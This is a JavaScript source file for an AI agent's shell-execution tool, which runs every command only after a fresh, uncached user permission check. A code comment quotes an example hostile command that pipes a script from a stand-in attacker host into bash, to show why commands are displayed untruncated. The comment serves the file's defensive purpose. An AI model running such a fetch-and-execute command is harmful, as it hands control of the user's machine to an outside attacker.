/**
 * Bash tool — execute shell commands in the vault directory.
 *
 * The highest-stakes tool in the registry. Permission gating is
 * NEVER cached (each command is its own decision; allowing `ls` once
 * must not allow `rm -rf` later) and the modal shows the exact command
 * verbatim so the user sees what they're authorizing.
 *
 * Modes:
 *   plan                 → refused
 *   default              → prompt per command, no remember toggle
 *   acceptEdits          → auto-allowed (matches CC parity)
 *   bypassPermissions    → auto-allowed
 *
 * Execution:
 *   - cwd = vault root
 *   - timeout = 120s default, capped at 600s (matching CC)
 *   - stdout + stderr captured and returned
 *   - non-zero exit reported with code, but is_error=false (the model
 *     should see and reason about the failure, not have it suppressed)
 */

const { spawn } = require("child_process");
const { attackDetector } = require("@gryphon/protect");

const SCHEMA = {
  name: "Bash",
  description:
    "Executes a shell command in the vault directory. Use for any task " +
    "outside the dedicated tools (Read/Write/Edit/Glob/Grep/WebFetch). " +
    "Prefer the dedicated tools when they fit — they're faster and safer. " +
    "Always quote paths with spaces.",
  input_schema: {
    type: "object",
    properties: {
      command: {
        type: "string",
        description: "The shell command to execute.",
      },
      description: {
        type: "string",
        description:
          "Short description of what the command does (5-10 words). " +
          "Helps the user decide whether to allow it.",
      },
      timeout: {
        type: "integer",
        description: "Timeout in milliseconds (max 600000 = 10 min). Default 120000 (2 min).",
      },
    },
    required: ["command"],
  },
};

const DEFAULT_TIMEOUT_MS = 120_000;
const MAX_TIMEOUT_MS = 600_000;
const MAX_OUTPUT_BYTES = 100_000;

async function execute(input, ctx) {
  const command = input.command;
  const description = input.description || "(no description provided)";
  const timeoutMs = Math.min(
    MAX_TIMEOUT_MS,
    Math.max(1000, parseInt(input.timeout || DEFAULT_TIMEOUT_MS, 10))
  );

  if (typeof command !== "string" || !command.trim()) {
    return _error("Missing or empty parameter: command");
  }

  // Show the full command verbatim — never truncate. A truncated title
  // can hide malicious suffixes (e.g., `ls && curl evil.com/hack.sh | bash`
  // where the pipe falls past the truncation point, so the title reads
  // like a benign `ls`). The modal body wraps long lines so full-length
  // commands stay readable.
  const classification = attackDetector.classify("Bash", { command }, ctx);
  const perm = await attackDetector.gate(classification, {
    ctx,
    action: "run shell command",
    target: command,
    detail:
      `Description: ${description}\n` +
      `Working directory: ${ctx.vaultRoot}\n` +
      `Timeout: ${timeoutMs / 1000}s\n` +
      `\n--- command ---\n${command}`,
    cacheable: false,  // never cache shell commands
    kind: "exec",
  });

  if (!perm.allow) return _error(perm.reason);

  return await _runCommand(command, ctx.vaultRoot, timeoutMs);
}

function _runCommand(command, cwd, timeoutMs) {
  return new Promise((resolve) => {
    let stdout = "";
    let stderr = "";
    let stdoutTrunc = false;
    let stderrTrunc = false;
    let killed = false;

    // Use shell=true so the model can use pipes, redirects, &&, etc.
    // This is what CC's Bash does too. The permission gate is what
    // protects us — the model can't issue an unsanctioned command.
    const proc = spawn(command, [], {
      cwd,
      shell: true,
      env: process.env,
    });

    const timer = setTimeout(() => {
      killed = true;
      try { proc.kill("SIGTERM"); } catch {}
      setTimeout(() => { try { proc.kill("SIGKILL"); } catch {} }, 5000);
    }, timeoutMs);

    proc.stdout.on("data", (chunk) => {
      const s = chunk.toString();
      if (Buffer.byteLength(stdout, "utf8") + Buffer.byteLength(s, "utf8") > MAX_OUTPUT_BYTES) {
        if (!stdoutTrunc) {
          stdout += s.substring(0, MAX_OUTPUT_BYTES - Buffer.byteLength(stdout, "utf8"));
          stdoutTrunc = true;
        }
      } else {
        stdout += s;
      }
    });

    proc.stderr.on("data", (chunk) => {
      const s = chunk.toString();
      if (Buffer.byteLength(stderr, "utf8") + Buffer.byteLength(s, "utf8") > MAX_OUTPUT_BYTES) {
        if (!stderrTrunc) {
          stderr += s.substring(0, MAX_OUTPUT_BYTES - Buffer.byteLength(stderr, "utf8"));
          stderrTrunc = true;
        }
      } else {
        stderr += s;
      }
    });

    proc.on("error", (err) => {
      clearTimeout(timer);
      resolve(_error(`Failed to spawn command: ${err.message}`));
    });

    proc.on("close", (code, signal) => {
      clearTimeout(timer);
      const parts = [];
      if (killed) {
        parts.push(`[killed by timeout after ${timeoutMs / 1000}s]`);
      }
      if (stdout) {
        parts.push(`--- stdout ---\n${stdout}${stdoutTrunc ? `\n[truncated at ${MAX_OUTPUT_BYTES} bytes]` : ""}`);
      }
      if (stderr) {
        parts.push(`--- stderr ---\n${stderr}${stderrTrunc ? `\n[truncated at ${MAX_OUTPUT_BYTES} bytes]` : ""}`);
      }
      parts.push(`--- exit ${signal ? `signal=${signal}` : `code=${code}`}`);

      // is_error=false: return non-zero exits as plain output so the
      // model sees and reasons about them. Only spawn-level failures
      // (above) count as is_error=true.
      resolve(_ok(parts.join("\n\n") || "(no output)"));
    });
  });
}

function _ok(text) {
  return { content: [{ type: "text", text }], isError: false };
}

function _error(text) {
  return { content: [{ type: "text", text: `Error: ${text}` }], isError: true };
}

module.exports = { SCHEMA, execute };
